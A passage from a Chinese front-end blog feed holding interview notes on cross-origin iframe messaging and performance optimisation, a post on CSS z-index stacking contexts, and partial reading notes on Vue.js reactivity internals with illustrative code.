<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>       </span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="javascript">            name: <span class="string">'aym'</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="javascript">        <span class="comment">// 向domain2传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain2.com'</span>);</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">// 接受domain2返回数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain2 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2、b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接收domain1的数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain1 ---&gt; '</span> + e.data);</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line">        if (data) &#123;</span><br><span class="line">            data.number = 16;</span><br><span class="line"></span><br><span class="line"><span class="javascript">            <span class="comment">// 处理后再发回domain1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain1.com'</span>);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="document-domain-iframe跨域"><a href="#document-domain-iframe跨域" class="headerlink" title="document.domain + iframe跨域"></a>document.domain + iframe跨域</h3><p>主域名相同子域名不同，手动<strong>设置document.domain为基本主域名</strong>来通信（window.parent）</p>
<p>1、父窗口：(<a href="http://www.domain.com/a.html" target="_blank" rel="noopener">http://www.domain.com/a.html</a>)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://child.domain.com/b.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> user = <span class="string">'admin'</span>;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>2、子窗口：(<a href="http://child.domain.com/b.html" target="_blank" rel="noopener">http://child.domain.com/b.html</a>)</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.domain = <span class="string">'domain.com'</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取父窗口中变量</span></span></span><br><span class="line"><span class="javascript">    alert(<span class="string">'get js data from parent ---&gt; '</span> + <span class="built_in">window</span>.parent.user);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="get-post区别"><a href="#get-post区别" class="headerlink" title="get post区别"></a>get post区别</h2><p><a href="http://www.w3school.com.cn/tags/html_ref_httpmethods.asp" target="_blank" rel="noopener">w3c</a></p>
<h2 id="token-session-cookie"><a href="#token-session-cookie" class="headerlink" title="token session cookie"></a>token session cookie</h2><p><a href="https://www.cnblogs.com/moyand/p/9047978.html" target="_blank" rel="noopener">三者区别</a></p>
<h1 id="高阶"><a href="#高阶" class="headerlink" title="高阶"></a>高阶</h1><h2 id="Lazyman"><a href="#Lazyman" class="headerlink" title="Lazyman"></a>Lazyman</h2><h2 id="serviceworker如何保证离线缓存资源更新"><a href="#serviceworker如何保证离线缓存资源更新" class="headerlink" title="serviceworker如何保证离线缓存资源更新"></a>serviceworker如何保证离线缓存资源更新</h2><h2 id="发布订阅模式和观察者模式的异同"><a href="#发布订阅模式和观察者模式的异同" class="headerlink" title="发布订阅模式和观察者模式的异同"></a>发布订阅模式和观察者模式的异同</h2><h2 id="CI-CD整体流程"><a href="#CI-CD整体流程" class="headerlink" title="CI/CD整体流程"></a>CI/CD整体流程</h2><h2 id="vue和react选型和比较"><a href="#vue和react选型和比较" class="headerlink" title="vue和react选型和比较"></a>vue和react选型和比较</h2><p><a href="https://cn.vuejs.org/v2/guide/comparison.html" target="_blank" rel="noopener">vue官方区别</a></p>
<h2 id="webpack的plugins和loaders的实现原理"><a href="#webpack的plugins和loaders的实现原理" class="headerlink" title="webpack的plugins和loaders的实现原理"></a>webpack的plugins和loaders的实现原理</h2><h2 id="webpack-热更新原理"><a href="#webpack-热更新原理" class="headerlink" title="webpack 热更新原理"></a>webpack 热更新原理</h2><p><a href="https://www.jianshu.com/p/f4c7254f4e24" target="_blank" rel="noopener">前端开发热更新原理解读</a></p>
<h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="页面级别的优化"><a href="#页面级别的优化" class="headerlink" title="页面级别的优化"></a>页面级别的优化</h3><h4 id="减少-HTTP请求数"><a href="#减少-HTTP请求数" class="headerlink" title="减少 HTTP请求数"></a>减少 HTTP请求数</h4><ul>
<li>设置HTTP缓存</li>
</ul>
<p>一些很少变化的图片设置HTTP Header中的Expires设置一个很长的过期头<br>一些变化不频繁而又可能会变的资源可以使用 Last-Modifed 来做请求验证</p>
<ul>
<li>资源合并与压缩</li>
</ul>
<p>多个js最终打包出来一个main.js，多个css合并。</p>
<p>开启gzip压缩</p>
<ul>
<li>图片类的</li>
</ul>
<p>css雪碧图、小的png图片转base64、图片瀑布流等可以使用懒加载，压缩图片。</p>
<ul>
<li><p>资源上CDN</p>
</li>
<li><p>脚本放在body内最后面</p>
</li>
</ul>
<p>html自上而下解析的，放在前面会阻碍html其他资源的加载。</p>
<p>如果在加载执行脚本的时候DOM元素并没有被解析，脚本就会因为DOM元素没有生成取不到响应元素</p>
<ul>
<li>动态加载js、异步加载</li>
</ul>
<p>在需要js时，动态添加script脚本。</p>
<p>使用async、defer，避免因为解析js造成阻塞DOM的构建</p>
<ul>
<li>css放在head里面</li>
</ul>
<p>放在head中可以尽早开始加载构建CSSOM，放在后面也会推迟页面渲染时间。</p>
<h3 id="代码级别的优化"><a href="#代码级别的优化" class="headerlink" title="代码级别的优化"></a>代码级别的优化</h3><h4 id="js-1"><a href="#js-1" class="headerlink" title="js"></a>js</h4><ul>
<li><p>减少DOM操作</p>
<ul>
<li><p>获取dom节点类数组，直接操作类数组比较耗性能，因为类数组是查询结果，每次调用都会查询一遍，转成数组再操作。</p>
</li>
<li><p>频繁的操作dom会造成重绘（颜色变化）和回流（改变形状大小造成布局变化）</p>
</li>
</ul>
</li>
<li><p>避免使用eval去生成变量</p>
</li>
<li><p>尽量避免使用全局变量，能用局部变量代替就用局部变量代替.</p>
</li>
<li><p>用户输入事件的处理函数去抖动</p>
</li>
<li><p>比较不用操作dom，耗费性能时间长的操作，放在Web Workers中执行（Web Workers不能操作dom）</p>
</li>
</ul>
<h4 id="html"><a href="#html" class="headerlink" title="html"></a>html</h4><p>避免过多和过深的dom，有些是可以用伪元素代替的。dom的渲染是深度遍历的。</p>
<p>图标可以使用iconfont代替</p>
<h4 id="css-1"><a href="#css-1" class="headerlink" title="css"></a>css</h4><ul>
<li>媒体类型（media type）和媒体查询（media query）来解除对渲染的阻塞。</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"index.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"print.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"print"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"other.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">media</span>=<span class="string">"(min-width: 30em) and (orientation: landscape)"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>降低样式选择器的复杂度</li>
</ul>
<p>用一个类代替，避免过多的选择</p>
<ul>
<li>多次改变一个元素的css属性可以合并成一个类名</li>
</ul>
<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><h2 id="二分"><a href="#二分" class="headerlink" title="二分"></a>二分</h2><h2 id="冒泡"><a href="#冒泡" class="headerlink" title="冒泡"></a>冒泡</h2><h2 id="冗余度"><a href="#冗余度" class="headerlink" title="冗余度"></a>冗余度</h2><h2 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h2><p><a href="https://juejin.im/post/5c1eec7bf265da61477034ae" target="_blank" rel="noopener">https://juejin.im/post/5c1eec7bf265da61477034ae</a></p>
<h1 id="项目经历"><a href="#项目经历" class="headerlink" title="项目经历"></a>项目经历</h1><!-- ## 在这条主线上你做过什么，遇到过什么坑，怎么解决一定要非常清楚等 -->]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>z-index的一些思考--堆叠上下文</title>
    <url>/2019/09/z-index%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%80%83.html</url>
    <content><![CDATA[<p>在一些层级较多的页面，z-index是神器，但不熟悉z-index常常导致一些层级问题很难解决。比如为什么这个z-index比那个大，还在它下面？</p>
<a id="more"></a>
<h2 id="position-static"><a href="#position-static" class="headerlink" title="position !== static"></a>position !== static</h2><p>z-index决定了元素在Z轴上的层级，如果你熟悉photoshop的话，其实就是等同于ps的<strong>图层</strong>。</p>
<p>但是z-indx的生效是有条件的，即<strong><code>position</code>属性值不是<code>static</code>的元素</strong>。</p>
<p>这有可能是<strong>z-index不生效的原因之一</strong>。</p>
<h2 id="父子关系下的z-index"><a href="#父子关系下的z-index" class="headerlink" title="父子关系下的z-index"></a>父子关系下的z-index</h2><p>设置一个<code>position !== static</code>的元素<code>z-index</code>的同时，会创建一个新的本地<strong>堆叠上下文</strong>，在这个元素之下，<strong>其所有的子元素的层级都会和该父元素相同</strong>，无论怎么设置z-index，即使是设置<code>position = absolute/fixed</code>。</p>
<p>这就类似ps里的组的概念，在一个组内，一个图层永远比在这个组之上的图层等级低。</p>
<p>所以，当“为什么这个z-index比那个大，还在它下面？”发生时，检查：</p>
<ul>
<li>是否未设置position</li>
<li>是否父级设置了z-index</li>
</ul>
<h2 id="堆叠上下文"><a href="#堆叠上下文" class="headerlink" title="堆叠上下文"></a>堆叠上下文</h2><p>The stacking context.</p>
<p>HTML 内元素发生层叠的时候的特定垂直顺序,即元素在用户视线方向上的顺序。</p>
<p>在一个堆叠上下文中，元素都是有等级顺序的，即：</p>
<p><code>正z-index &gt; 内联元素 &gt; 浮动元素 &gt; 块级元素 &gt; 负z-index &gt; border &gt; background</code></p>
<p>具体的内容就不赘述了，参考：<a href="https://www.jianshu.com/p/2bc43e9680bc" target="_blank" rel="noopener">CSS堆叠上下文（The stacking context）</a></p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>《深入浅出Vue.js》读书笔记</title>
    <url>/2019/07/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAVue.js%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0.html</url>
    <content><![CDATA[<blockquote>
<p>关于vue的原理看了很多博客文章，但总是很零碎，不系统，而且可能有错误的地方。正好上次参加趣店&amp;活动行举办的厦门大前端沙龙，提问拿到了几本书，其中包括《深入浅出Vue.js》<br>时间慢下来好好读书吧。</p>
</blockquote>
<a id="more"></a>
<h2 id="Object的数据响应"><a href="#Object的数据响应" class="headerlink" title="Object的数据响应"></a>Object的数据响应</h2><h3 id="变化侦测"><a href="#变化侦测" class="headerlink" title="变化侦测"></a>变化侦测</h3><p>vue的最大的特点就是响应式和组件化了。如何实现响应式……这也是网上最多的问题和文章分享的主题了。</p>
<p><strong>如何侦测一个对象的变化？</strong></p>
<p>目前有两个方法：</p>
<ul>
<li>使用ES5的Object.defineProperty</li>
<li>ES6的Proxy</li>
</ul>
<p>vue2.x使用的是defineProperty，所以不支持 IE8 及以下版本。在vue3.0中，该用了Proxy。Proxy后续也要总结一下。</p>
<p>通过defineProperty定义数据，每次读取该数据，get函数就会被触发，每次设置新的值，set函数就会被触发。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.defineProperty (data, key, &#123;</span><br><span class="line">    enumerable: <span class="literal">true</span>,</span><br><span class="line">    configurable: <span class="literal">true</span>,</span><br><span class="line">    value: <span class="string">""</span>,</span><br><span class="line">    <span class="keyword">get</span>: function () &#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">set</span>: function (newVal) &#123;</span><br><span class="line">        <span class="keyword">if</span> (value === newVal) <span class="keyword">return</span>;</span><br><span class="line">        value = newVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<h3 id="依赖收集"><a href="#依赖收集" class="headerlink" title="依赖收集"></a>依赖收集</h3><p>我们之所以要监测数据的变化，是因为当数据变化时，可以通知那些使用了该数据的地方。vue的解决方法是先收集依赖，数据变化时，把收集好的依赖循环触发一遍。</p>
<p>即，<strong>在getter中收集依赖，在setter中触发依赖</strong>。</p>
<p>vue封装了一个Dep类，用于收集储存依赖，并在其封装了一些收集、删除依赖与向依赖发送通知的发放；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Dep</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="keyword">this</span>.subs = []</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addSub(sub) &#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.push(sub)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// remove...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收集依赖的方法，若存在一个依赖，则将该依赖push到subs数组中</span></span><br><span class="line">    depend() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.target) <span class="keyword">this</span>.addSub(<span class="built_in">window</span>.target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环通知每一个依赖</span></span><br><span class="line">    notify() &#123;</span><br><span class="line">        <span class="comment">// 数组深拷贝，也可用concat()</span></span><br><span class="line">        <span class="keyword">const</span> subs = <span class="keyword">this</span>.subs.silce();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, len = subs.length; i &lt; len; i ++) &#123;</span><br><span class="line">            <span class="comment">// update()为依赖 更新自己数据所定义的触发方法，后面会写</span></span><br><span class="line">            subs[i].update();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>vue封装了defineProperty函数，来将依赖Dep类与变化侦测相结合：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dep = <span class="keyword">new</span> Dep();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty (data, key, &#123;</span><br><span class="line">        enumerable: <span class="literal">true</span>,</span><br><span class="line">        configurable: <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">get</span>: function () &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在getter中收集依赖</span></span><br><span class="line">            dep.depend();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">set</span>: function (newVal) &#123;</span><br><span class="line">            <span class="keyword">if</span> (val === newVal) <span class="keyword">return</span>;</span><br><span class="line">            val = newVal;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在setter中通知依赖</span></span><br><span class="line">            dep.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="依赖-Watcher"><a href="#依赖-Watcher" class="headerlink" title="依赖 Watcher"></a>依赖 Watcher</h3><p>在vue中，依赖可能是template，也可能是用户手动写的watch；因此，vue抽象了一个能集中处理的类：Watcher。</p>
<p>Watcher是一个中介，数据变化是通知它，然后它再通知其他地方。在setter中执行watcher.udate方法。</p>
<p>一个常见的例子：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">vm.$watch(<span class="string">"name"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">newVal, oldVal</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// something</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>我们在新建一个watch时，把这个watcher实例添加到name的dep中，当name改变触发setter时，遍历依赖数组dep，到该watcher时，触发其update方法，在update()中再执行我们定义的回调函数。</p>
<p>so：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Watcher</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(vm, expOrFn, cb) &#123;</span><br><span class="line">        <span class="comment">// vm为vue实例</span></span><br><span class="line">        <span class="comment">// expOrFn为表达式或函数（这个函数可能访问了多个数据，就会创建多个依赖），在上面的例子里，expOrFn为"name"</span></span><br><span class="line">        <span class="comment">// cb为回调函数,callback的缩写</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.vm = vm;</span><br><span class="line">        <span class="comment">// 解析expOfFn的路径，读取它的值（parsePath函数是一个闭包，返回的是一个函数，该函数参数应该传这个值所在对象，其实就是vm）</span></span><br><span class="line">        <span class="comment">// 所以这里getter只是一个函数</span></span><br><span class="line">        <span class="keyword">this</span>.getter = parsePath(expOfFn);</span><br><span class="line">        <span class="keyword">this</span>.cb = cb；</span><br><span class="line">        <span class="comment">// 每实例化一个Watcher，都自动触发get(),触发收集依赖的逻辑</span></span><br><span class="line">        <span class="keyword">this</span>.value = <span class="keyword">this</span>.get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">get</span>() &#123;</span><br><span class="line">        <span class="built_in">window</span>.target = <span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 读取expOrFn的值，从而触发了"name"的getter，从而触发了收集依赖：dep.depend();</span></span><br><span class="line">        <span class="comment">// depend() &#123;</span></span><br><span class="line">        <span class="comment">//     if (window.target) this.addSubs(window.target);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">// 而depend()中是将window.target存入依赖，此时windo.target指向了Watcher的this！，正好把这个Watcher存入依赖，妙啊</span></span><br><span class="line">        <span class="keyword">let</span> value = <span class="keyword">this</span>.getter.call(<span class="keyword">this</span>.vm, <span class="keyword">this</span>.vm);</span><br><span class="line">        <span class="comment">// 用完window.target就置为undefined，备胎...</span></span><br><span class="line">        <span class="built_in">window</span>.target = <span class="literal">undefined</span>;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// "name"数据改变时，触发它自己的setter，然后遍历依赖。触发了该watcher的update方法。</span></span><br><span class="line">    <span class="comment">// 该方法调用回调函数</span></span><br><span class="line">    update() &#123;</span><br><span class="line">        <span class="comment">// 此时watcher中的value是老的值</span></span><br><span class="line">        <span class="keyword">const</span> oldValue = <span class="keyword">this</span>.value;</span><br><span class="line">        <span class="comment">// 通过get()获取"name"最新的值，get中会判断这个watcher是否被加入到依赖中，防止重复添加依赖</span></span><br><span class="line">        <span class="keyword">this</span>.value = <span class="keyword">this</span>.get();</span><br><span class="line">        <span class="comment">// callback中的this指向vm，然后传入newVal，oldVal，执行callback</span></span><br><span class="line">        <span class="keyword">this</span>.cb.call(<span class="keyword">this</span>.vm, <span class="keyword">this</span>.value, oldValue);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="递归侦测所有的Key-Observer类"><a href="#递归侦测所有的Key-Observer类" class="headerlink" title="递归侦测所有的Key Observer类"></a>递归侦测所有的Key Observer类</h3><p>前面都是手动侦测一个属性，在实际中，一个对象可能有很多属性。因此，vue封装了一个Observer类，将一个数据中的所有属性，包括子属性都转换为 getter/setter 的形式，这样就不会漏掉所有的值变化。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(value) &#123;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数组和对象要分开处理</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">            <span class="keyword">this</span>.walk(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 循环为每个属性添加侦测</span></span><br><span class="line">    walk(obj) &#123;</span><br><span class="line">        <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">            defineReactive(obj, keys[i], obj[keys[i]]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span>(<span class="params">data, key, val</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果子属性还是个对象，则递归为这个对象的子属性添加侦测</span></span><br><span class="line">    <span class="keyword">if</span> (type val === <span class="string">"object"</span>) <span class="keyword">new</span> Observer;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> dep = <span class="keyword">new</span> Dep();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty (data, key, &#123;</span><br><span class="line">        enumerable: <span class="literal">true</span>,</span><br><span class="line">        configurable: <span class="literal">true</span>,</span><br><span class="line">        <span class="keyword">get</span>: function () &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在getter中收集依赖</span></span><br><span class="line">            dep.depend();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">set</span>: function (newVal) &#123;</span><br><span class="line">            <span class="keyword">if</span> (val === newVal) <span class="keyword">return</span>;</span><br><span class="line">            val = newVal;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 在setter中通知依赖</span></span><br><span class="line">            dep.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="object的问题"><a href="#object的问题" class="headerlink" title="object的问题"></a>object的问题</h3><p>在一些方法里，我们手动向已响应的对象中新增一个属性或删除一个属性：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.obj.name = <span class="string">"tom"</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">this</span>.obj.name;</span><br></pre></td></tr></table></figure>
<p>由于未通过Observer去添加侦测，所有这些新增属性的变化就侦测不到。因此，vue通过vm.$set和vm.$delete这两个API来解决这个问题。在vue3.0中，由于使用ES6的Proxy，故不存在这个问题。</p>
<h2 id="数组的数据响应"><a href="#数组的数据响应" class="headerlink" title="数组的数据响应"></a>数组的数据响应</h2><p>1、重写数组的方法。</p>
<h2 id="虚拟DOM"><a href="#虚拟DOM" class="headerlink" title="虚拟DOM"></a>虚拟DOM</h2><p>在一个web应用中，状态会不断发生变化，<strong>如何在数据变化后重新渲染到页面上？</strong></p>
<p>为此，Angular用了脏检查，Vue2.0与React用了虚拟DOM。</p>
<p>虚拟DOM：通过状态生成一个虚拟节点树（Virtual Node），然后使用虚拟节点树去渲染，每次状态发生改变时，<strong>使用新生成的虚拟节点树和上一次生成的虚拟节点树进行对比</strong>，只渲染不同的部分。</p>
<p>在Vue2.0中，<strong>每一个组件会实例化一个Watcher，当组件内状态发生变化时，只通知到组件，然后组件内部通过虚拟DOM去对比和渲染</strong>。也就是说，<strong>一个组件内的数据发生变化，整个组件都会编译生成新的vnode。</strong>在Vue1.0中，每一个数据都有自己的Watcher，数据变化就通知哪些依赖节点更新，从而不需要进行对比。这种方式粒度很细，导致内存开销与依赖追踪开销很大。故Vue2.0优化了这一点，采用了中粒度的做法；</p>
<p>Vue通过编译将模版转换成渲染函数，执行渲染函数得到了与真是DOM对应的虚拟节点树vnode。并将该<strong>虚拟节点缓存</strong>，数据变化时生成新的vnode，通过一个diff算法，将新vnode与oldVnode进行对比。最终更新视图。<br>流程：<br><img src="https://static.simmzl.cn/blog/2019-07-19-%E6%9C%AA%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6.jpeg" alt></p>
<h2 id="VNode"><a href="#VNode" class="headerlink" title="VNode"></a>VNode</h2><p>vue中定义了一个<strong>VNode类</strong>，使用它实例化不同类型的vnode实例，来表示不同的DOM元素。这些vnode其实就是一个普通的对象，使用不同的属性来描述DOM的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// VNode类代码</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">VNode</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(tag, data, children, text, elm, context, componentOptions, asycncFactory) &#123;</span><br><span class="line">        <span class="keyword">this</span>.tag = tag;</span><br><span class="line">        <span class="keyword">this</span>.data = data;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    getChild() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.componentInstance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="VNode类型"><a href="#VNode类型" class="headerlink" title="VNode类型"></a>VNode类型</h3><ul>
<li>注释节点</li>
<li>文本节点</li>
<li>元素节点</li>
<li>组件节点</li>
<li>函数式节点</li>
<li>克隆节点</li>
</ul>
<p>举个例子：</p>
<p><strong>文本节点：</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">createTextVNode</span>(<span class="params">val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> VNode(<span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="built_in">String</span>(val));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过这个方法就生成一个文本节点：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    text: <span class="string">"xxx"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>克隆节点</strong>用于优化静态节点和插槽节点。即创建克隆节点把原节点属性克隆一遍。</p>
<p><strong>元素节点</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span>hi<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>对应：</p>
